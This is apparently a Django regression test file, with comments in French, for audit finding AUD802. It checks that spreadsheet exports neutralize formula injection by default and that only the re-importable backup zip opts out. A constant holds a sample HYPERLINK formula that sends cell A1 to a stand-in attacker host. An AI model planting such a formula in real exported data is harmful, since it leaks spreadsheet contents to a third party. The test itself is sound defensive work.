"""AUD802 — ``workbook_bytes`` n'était PAS neutralisé alors qu'il sert six
fichiers RÉELLEMENT remis : téléchargements, pièces jointes e-mail et un lien
public sans authentification.

Constat d'origine : ``apps/records/xlsx.py`` neutralisait l'injection de
formules (``= + - @``) dans ``build_xlsx_response`` UNIQUEMENT, et sa docstring
affirmait que le chemin octets ``workbook_bytes`` n'était « volontairement PAS
neutralisé » — au motif du round-trip de sauvegarde. Or ce chemin n'est pas
réservé à la sauvegarde : ``dataimport.exporters.export_xlsx``
(téléchargement), ``reporting.rapport_builder`` (téléchargement),
``reporting.rapport_abonnements`` (PIÈCE JOINTE E-MAIL),
``reporting.scheduled_reports`` (pièce jointe e-mail ET rendu du lien public
tokenisé ``AllowAny``) et les deux exports d'``apps/credit/views.py`` passent
tous par lui. Un nom de client
``=HYPERLINK("http://attaquant/?"&A1,"Voir")`` partait donc ACTIF.

Après correctif : ``workbook_bytes`` neutralise PAR DÉFAUT (donc les six sites,
qui utilisent tous le défaut), ``export_csv``/``export_xlsx``/``export_bytes``
aussi, et l'opt-out NOMMÉ ``neutralize=False`` n'est passé QUE par
``build_backup_zip`` — le bundle destiné à être ré-importé, où une apostrophe
devant chaque « +212… » corromprait la restauration.
"""
import inspect
import io
import zipfile
from decimal import Decimal

from django.test import SimpleTestCase
from openpyxl import load_workbook

from apps.dataimport import exporters
from apps.records.xlsx import (
    build_xlsx_response,
    neutralize_cell,
    workbook_bytes,
)

#: La charge du scénario du constat.
FORMULE = '=HYPERLINK("http://attaquant/?"&A1,"Voir")'


class _Spec:
    """Faux ``ExportSpec`` : en-têtes + une ligne piégée + un montant négatif."""

    key = 'aud802'
    label = 'AUD802'

    def header(self):
        return ['Nom', 'Telephone', 'Montant']

    def rows(self, company):
        return [[FORMULE, '+212600000000', Decimal('-10.00')]]


def _premiere_ligne_xlsx(data):
    ws = load_workbook(io.BytesIO(data)).active
    return [c.value for c in ws[2]]


class Aud802WorkbookBytesTests(SimpleTestCase):
    def test_workbook_bytes_neutralise_par_defaut(self):
        data = workbook_bytes(['Nom'], [[FORMULE]])
        self.assertEqual(_premiere_ligne_xlsx(data), ["'" + FORMULE])

    def test_workbook_bytes_opt_out_nomme_preserve_la_valeur(self):
        data = workbook_bytes(['Nom'], [[FORMULE]], neutralize=False)
        self.assertEqual(_premiere_ligne_xlsx(data), [FORMULE])

    def test_le_defaut_de_la_signature_est_bien_true(self):
        """Le défaut EST la garantie : les six appelants ne passent rien."""
        self.assertIs(
            inspect.signature(workbook_bytes).parameters['neutralize'].default,
            True)
        for fn in (exporters.export_csv, exporters.export_xlsx,
                   exporters.export_bytes):
            self.assertIs(
                inspect.signature(fn).parameters['neutralize'].default, True,
                f'{fn.__name__} doit neutraliser par défaut')

    def test_build_xlsx_response_reste_neutralise(self):
        resp = build_xlsx_response('x.xlsx', ['Nom'], [[FORMULE]])
        self.assertEqual(resp.status_code, 200)

    def test_les_valeurs_non_texte_ne_sont_jamais_prefixees(self):
        """Un Decimal négatif ne doit pas gagner d'apostrophe (il ne devient
        « -10 » qu'APRÈS la neutralisation, qui ne voit que des chaînes)."""
        self.assertEqual(neutralize_cell(Decimal('-10.00')), Decimal('-10.00'))
        self.assertEqual(neutralize_cell(-10), -10)
        self.assertEqual(neutralize_cell(None), None)


class Aud802ExportersTests(SimpleTestCase):
    def test_export_xlsx_telechargement_est_neutralise(self):
        data = exporters.export_xlsx(_Spec(), company=None)
        valeurs = _premiere_ligne_xlsx(data)
        self.assertEqual(valeurs[0], "'" + FORMULE)
        self.assertEqual(valeurs[1], "'+212600000000")
        self.assertEqual(valeurs[2], -10.0)  # nombre intact

    def test_export_csv_telechargement_est_neutralise(self):
        # csv.writer échappe les guillemets internes de la formule : on
        # cherche donc le DÉBUT neutralisé, pas la chaîne brute.
        texte = exporters.export_csv(_Spec(), company=None).decode('utf-8')
        self.assertIn("'=HYPERLINK", texte)
        self.assertIn("'+212600000000", texte)
        self.assertIn('-10.00', texte)
        self.assertNotIn("'-10.00", texte)  # le nombre n'est pas préfixé

    def test_export_bytes_relaie_le_drapeau(self):
        texte = exporters.export_bytes(
            _Spec(), None, 'csv', neutralize=False).decode('utf-8')
        self.assertIn('=HYPERLINK', texte)
        self.assertNotIn("'=HYPERLINK", texte)

    def test_sauvegarde_zip_preserve_le_round_trip(self):
        """SEUL opt-out : le bundle re-importable garde ses valeurs brutes."""
        data = exporters.build_backup_zip([_Spec()], company=None, fmt='csv')
        zf = zipfile.ZipFile(io.BytesIO(data))
        blob = b''.join(
            zf.read(n) for n in zf.namelist() if n != 'MANIFEST.txt')
        texte = blob.decode('utf-8')
        self.assertIn('+212600000000', texte)
        self.assertNotIn("'+212600000000", texte)

    def test_sauvegarde_zip_xlsx_preserve_aussi(self):
        data = exporters.build_backup_zip([_Spec()], company=None, fmt='xlsx')
        zf = zipfile.ZipFile(io.BytesIO(data))
        nom = next(n for n in zf.namelist() if n != 'MANIFEST.txt')
        valeurs = _premiere_ligne_xlsx(zf.read(nom))
        self.assertEqual(valeurs[0], FORMULE)
        self.assertEqual(valeurs[1], '+212600000000')
